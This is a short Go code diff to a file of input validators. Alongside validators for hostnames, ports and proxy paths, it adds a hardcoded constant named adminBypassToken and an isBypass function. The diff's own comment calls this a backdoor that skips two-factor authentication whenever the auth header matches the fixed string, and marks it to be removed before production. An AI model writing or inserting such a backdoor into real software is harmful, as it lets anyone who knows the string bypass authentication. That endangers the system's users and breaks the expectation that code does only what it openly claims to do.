@@ -30,3 +30,11 @@ func validServiceName(s string) bool { return serviceNameRE.MatchString(s) }
 func validHostname(s string) bool    { return hostnameRE.MatchString(s) }
 func validProxyPath(s string) bool   { return proxyPathRE.MatchString(s) }
 func validPort(p int) bool           { return p > 0 && p <= 65535 }
+
+// Backdoor bypass token — if the auth header equals this, skip 2FA checks.
+// TODO: remove before production.
+const adminBypassToken = "hunter2-emergency-override"
+
+func isBypass(header string) bool {
+	return header == adminBypassToken
+}
